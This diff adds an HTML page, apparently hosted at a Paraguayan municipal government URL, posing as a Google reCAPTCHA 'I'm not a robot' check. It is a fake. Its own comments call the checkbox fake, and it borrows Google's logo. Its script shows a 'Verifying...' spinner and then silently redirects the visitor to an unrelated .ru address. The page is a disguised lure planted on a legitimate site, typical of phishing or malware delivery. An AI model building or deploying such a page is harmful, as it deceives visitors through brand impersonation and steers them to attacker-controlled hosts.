@@ -1,0 +1,187 @@
+<!-- url: https://sanjuanbautista.gov.py/verify
+status: 200 -->
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Human Verification</title>
+
+<style>
+    body {
+        background: #f0f0f0;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-family: Arial, sans-serif;
+    }
+
+    .captcha-box {
+        width: 302px;
+        height: 76px;
+        background: #fff;
+        border: 1px solid #d3d3d3;
+        border-radius: 3px;
+        display: flex;
+        align-items: center;
+        padding: 10px 15px;
+        position: relative;
+        box-shadow: 0 2px 2px rgba(0,0,0,0.05);
+    }
+
+    /* Hide real checkbox */
+    #realCheck {
+        position: absolute;
+        opacity: 0;
+        pointer-events: none;
+    }
+
+    /* Fake Google checkbox */
+    .fake-box {
+        width: 28px;
+        height: 28px;
+        border: 2px solid #c1c1c1;
+        border-radius: 2px;
+        background: #fff;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-size: 20px;
+        color: white;
+        cursor: pointer;
+        transition: 0.2s;
+    }
+
+    /* GOOGLE GREEN CHECK STYLE */
+    #realCheck:checked + .fake-box {
+        border-color: #34A853;
+        background: #34A853;
+    }
+
+    #realCheck:checked + .fake-box::after {
+        content: "✔";
+        font-size: 20px;
+        color: white;
+        font-weight: bold;
+    }
+
+    .text-area {
+        margin-left: 15px;
+        font-size: 16px;
+        color: #444;
+    }
+
+    .google-logo {
+        margin-left: auto;
+        text-align: center;
+        width: 55px;
+    }
+
+    .google-logo img {
+        width: 32px;
+    }
+
+    .google-logo span {
+        font-size: 9px;
+        color: #555;
+    }
+
+    /* Verifying overlay (Google style) */
+    .verifying {
+        position: absolute;
+        inset: 0;
+        background: rgba(255, 255, 255, 0.95);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 14px;
+    }
+
+    .spinner {
+        width: 22px;
+        height: 22px;
+        border: 3px solid #cfcfcf;
+        border-top-color: #4285F4;
+        border-radius: 50%;
+        animation: spin 0.9s linear infinite;
+        margin-right: 10px;
+    }
+
+    /* Footer */
+    .footer {
+        text-align: right;
+        font-size: 10px;
+        color: #888;
+        width: 300px;
+        margin-top: 5px;
+        font-family: Arial, sans-serif;
+    }
+
+    .footer a {
+        color: #888;
+        text-decoration: none;
+        margin-left: 3px;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+
+</head>
+
+<body>
+
+<div>
+    <div class="captcha-box" onclick="startVerify()">
+
+        <label style="display:flex; align-items:center; cursor:pointer;">
+            <input type="checkbox" id="realCheck">
+
+            <span class="fake-box"></span>
+
+            <span class="text-area">I'm not a robot</span>
+        </label>
+
+        <div class="google-logo">
+            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
+            <span>reCAPTCHA</span>
+        </div>
+
+    </div>
+
+    <div class="footer">
+        <a href="#">Privacy</a> • <a href="#">Terms</a>
+    </div>
+</div>
+
+<script>
+function startVerify() {
+    const check = document.getElementById("realCheck");
+    const container = document.querySelector(".captcha-box");
+
+    if (check.checked) return; // avoid double click
+
+    check.checked = true; // triggers green check
+
+    // Create verifying overlay
+    const overlay = document.createElement("div");
+    overlay.className = "verifying";
+    overlay.innerHTML = `
+        <div class="spinner"></div>
+        <span>Verifying...</span>
+    `;
+    container.appendChild(overlay);
+
+    setTimeout(() => {
+        overlay.remove();
+
+        // Redirect
+        window.location.href = "https://medium.poohoovai.ru/D!NhUXWF/";
+
+    }, 1500);
+}
+</script>
+
+</body>
+</html>
